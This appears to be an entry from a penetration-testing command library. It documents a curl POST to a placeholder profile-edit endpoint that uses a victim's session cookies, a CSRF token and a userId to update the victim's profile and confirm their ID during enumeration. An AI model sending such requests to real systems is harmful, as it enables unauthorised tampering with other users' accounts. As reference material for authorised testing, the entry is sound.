---
id: cmd-curl-profile-victim-enum-001
data: >-
  curl -X POST https://target.com/EditUserProfile/Save -H "Cookie:
  .AspNetCore.Antiforgery.wZhPOrJ1UhI=...; TS014b77bb=..." -H "Content-Type:
  application/x-www-form-urlencoded" -d
  "Email=test@gmail.com&PositionTitleIds=10&Title=Pentester&FirstName=attacking&MiddleName=test&LastName=wearehackerone&PhoneNumber=13333333333333339&LanguageId=&Password=&ConfirmPassword=&userId=123465&passChange=true&PersonProfileId=0&CitizenshipId=101&__RequestVerificationToken=CSRF_TOKEN_HERE"
tags:
  - web
  - post
  - enumeration
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:06.639Z'
verified: false
validated: true
submitted: true
---
# curl-profile-update-victim-enum

## Command

```bash
curl -X POST https://target.com/EditUserProfile/Save \
  -H "Cookie: .AspNetCore.Antiforgery.wZhPOrJ1UhI=...; TS014b77bb=..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "Email=test@gmail.com&PositionTitleIds=10&Title=Pentester&FirstName=attacking&MiddleName=test&LastName=wearehackerone&PhoneNumber=13333333333333339&LanguageId=&Password=&ConfirmPassword=&userId=123465&passChange=true&PersonProfileId=0&CitizenshipId=101&__RequestVerificationToken=CSRF_TOKEN_HERE"
```

## Description

Updates the victim's profile to reveal and confirm the userId parameter during enumeration phase.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-H "Cookie: ..."` | Victim's session cookies | Yes |
| `-d "..."` | Form data with userId | Yes |
| `userId` | Victim's ID (e.g., 123465) | Yes |
| `__RequestVerificationToken` | Valid CSRF token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/EditUserProfile/Save -H "Cookie: ..." -d "Email=test@gmail.com&userId=123465&..."
```

### Advanced Usage

With phone number update for testing:

```bash
curl -X POST https://target.com/EditUserProfile/Save -H "Cookie: ..." -d "PhoneNumber=13333333333333339&userId=123465&..."
```

## Expected Output

200 OK response; profile updated, userId=123465 visible in request.

## Related

- [[Related Procedure: Enumerate-Victims-User-ID]]
